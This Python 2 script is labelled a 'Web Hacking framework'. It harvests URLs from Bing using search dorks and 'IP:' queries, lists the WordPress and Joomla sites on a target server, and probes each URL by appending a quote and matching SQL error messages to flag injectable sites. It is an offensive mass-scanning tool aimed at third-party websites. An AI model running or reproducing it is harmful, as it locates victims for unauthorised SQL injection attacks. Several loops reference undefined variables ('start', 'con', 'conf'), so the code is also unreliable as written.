#############################################################################################################################
import urllib
import os
import re
from time import sleep
from datetime import date
############################################################################################################################
def welcome(modulename):

  print  """
          |==========================================================|
          |======================  [ 404 ]   ========================|
          |==============[ lordnotfound404@gmail.com ]===============|
          |==========[ https://www.facebook.com/404andreas]==========|
          |==========================================================|
          |      ****      Web Hacking framwork by 404      ***      |
          |==========================================================|
        """
  print  '#######    ' + modulename
############################################################################################################################
def getsitesbing(dork , filename ):
  welcome("get sites from Bing ")

  # extract Urls from a Bing search engin querying the given dork
  # the result is stored in a text file
  
  file2 =open(filename+'.txt','w')
  start=0
  end=200
  sleep(3)
  #print "[info]Getting Websites From Bing ... "
  while  start <= end :
    try:
      con = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      conf = open(con[0])
      readd=conf.read()
      find=re.findall('<h2><a href="(.*?)"',readd)
      start = start+10
    except IOError:
      print "[ERROR]network error "
      print "[Info]reconnecting "
      sleep(10)
      print "[Info]retrying "
    try :

      for i in range(len(find)):
       rez=find[i]+"'"
       file2.write(rez + '\n')
    except IOError:
      print "[ERROR]No result found"
    

############################################################################################################################
def check_sqli(url):
  welcome("check for sql injection")
   #parse the html code of a given URL and look for SQL errors

   try:
        conn = urllib.urlretrieve(url)
        connf = open(conn[0])
        readd=connf.read()
        findd=re.findall('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',readd)
        if(findd):
          #print "[SLQi] : "+ url 
          return 1
        else:
          return 0
   except IOError:
        print "network error"

#############################################################################################################################
def sqlihunt(dork , filename ):
  welcome('dork and fond SQL injectable sites')

  # extract Urls from a Bing search engin querying the given dork and test every url in 
  # the result is stored in a text file 
  file2 =open(filename+'.txt','w')
  startt=0
  endd=200
  sleep(3)
  print "[info]Getting Websites From Bing ... "
  while startt<=endd :
    try:
      cond = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      condf = open(con[0])
      readdd=condf.read()
      conf.close()
      find=re.findall('<h2><a href="(.*?)"',readdd)
      startt = startt+10
      #return find 
    except IOError:
      print "[ERROR]network error "
      print "[Info]reconnecting "
      sleep(10)
      print "[Info]retrying "
    try :
      for i in range(len(find)):
                  rez=find[i]+"'"
                  tst = urllib.urlretrieve(rez)
                  tstf = open(tst[0])
                  tstdd= tstf.read()
                  tstfind=re.findall('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',tstdd)
                  if(tstfind):
                    print "[SLQi] : "+ rez 
                    file2.write(rez + '\n')
                  else:
                    print "[No SQLi ] : " + rez
    except IOError:
      print "[ERROR]No result found"
    
##########################################################################################################################
def serverTargeting(IP):
  welcome("perform many dork based scans")
  #fil = open(logsfilename+'.txt','a')
  #fil.write("[Info] : new target "+now.strftime("%A %d %b %Y")+"IP adress : "+IP)
  #print "[Info] : new target "+now.strftime("%A %d %b %Y")+"IP adress : "+IP
  #fil.write("[Info] : getting links from Bing")
  print " New TARGET " + IP
  print "[Info] : getting Hosted domains from Bing"
  file2 =open(IP+'hosted.txt','w')
  start=0
  end=200
  sleep(3)
  dork = 'IP:'+IP
  #print "[info]Getting Websites From Bing ... "
  while  start <= end :
    try:
      con = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      conf = open(con[0])
      readd=conf.read()
      find=re.findall('<h2><a href="(.*?)"',readd)
      start = start+10
    except IOError:
      print "[ERROR]network error "
      print "[Info]reconnecting "
      sleep(10)
      print "[Info]retrying "
    try :

      for i in range(len(find)):
       rez=find[i]+"'"
       file2.write(rez + '\n')
    except IOError:
      print "[ERROR]No result found"
  print "[Info] : links list saved in file "+IP+"hosted.txt"
  print "[Info] : getting wordpress sites from server ...."

  
  file2 =open(IP+'wp_Powred.txt','w')
  start=0
  end=200
  sleep(3)
  dork = 'IP:'+IP + "  /wp-content/"
  #print "[info]Getting Websites From Bing ... "
  while  start <= end :
    try:
      con = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      conf = open(con[0])
      readd=conf.read()
      find=re.findall('<h2><a href="(.*?)"',readd)
      start = start+10
    except IOError:
      print "[ERROR]network error "
      print "[Info]reconnecting "
      sleep(10)
      print "[Info]retrying "
    try :

      for i in range(len(find)):
       rez=find[i]+"'"
       file2.write(rez + '\n')
    except IOError:
      print "[ERROR]No result found"
  
  #getsitesbing("IP:"+IP+" /wp-content/" , 'wp_Powred' )
  print "[Info] : links list saved in file "+IP+"wp_Powred.txt"
  print "[Info] : getting joomla sites from server ...."

   
  file2 =open(IP+'joom_Powred.txt','w')
  start=0
  end=200
  sleep(3)
  dork = 'IP:'+IP +" index.php?option=com_content"
  #print "[info]Getting Websites From Bing ... "
  while  start <= end :
    try:
      con = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      conf = open(con[0])
      readd=conf.read()
      find=re.findall('<h2><a href="(.*?)"',readd)
      start = start+10
    except IOError:
      print "[ERROR]network error "
      print "[Info]reconnecting "
      sleep(10)
      print "[Info]retrying "
    try :

      for i in range(len(find)):
       rez=find[i]+"'"
       file2.write(rez + '\n')
    except IOError:
      print "[ERROR]No result found"
  
  #getsitesbing("IP:"+IP+" index.php?option=com_content" , 'joom_Powred' )
  print "[Info] : links list saved in file "+IP+"joom_Powred.txt"
  print "[Info] : looking for SQLi vulnérable links"
  #sqlihunt("IP:"+IP+' php?id=' , "sqli_inject" )
  file2 =open(IP+'sqli_inject.txt','w')
  startt=0
  endd=200
  sleep(3)
  dork= "IP:"+IP+" php?id="
  #print "[info] : Getting Websites From Bing ... "
  while startt<=endd :
    try:
      cond = urllib.urlretrieve('http://www.bing.com/search?q='+dork+"&first="+str(start))
      #con = con = urllib.urlretrieve('http://www.bing.com/search?q=ip%3A41.203.11.42+%22php%3Fid%3D%22&go=&qs=ds&form=QBLH&filt=all')
      condf = open(con[0])
      readdd=condf.read()
      find=re.findall('<h2><a href="(.*?)"',readdd)
      startt = startt+10
      #return find 
    except IOError:
      print "[ERROR]network error "
      print "[Info]reconnecting "
      sleep(10)
      print "[Info]retrying "
    try :
      for i in range(len(find)):
                  rez=find[i]+"'"
                  tst = urllib.urlretrieve(rez)
                  tstf = open(tst[0])
                  tstdd= tstf.read()
                  tstfind=re.findall('/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch_row()|SELECT * FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i|You have an error in your SQL syntax|Microsoft VBScript runtime error',tstdd)
                  if(tstfind):
                    print "[SLQi] : "+ rez 
                    file2.write(rez + '\n')
                  else:
                    print "[No SQLi ] : " + rez
    except IOError:
      print "[ERROR]No result found"
  print "[Info] : links saved in file "+IP+"sqli_inject.txt"
  print " ALL is done good luck dude !!!!! "

##############################################################################################################################

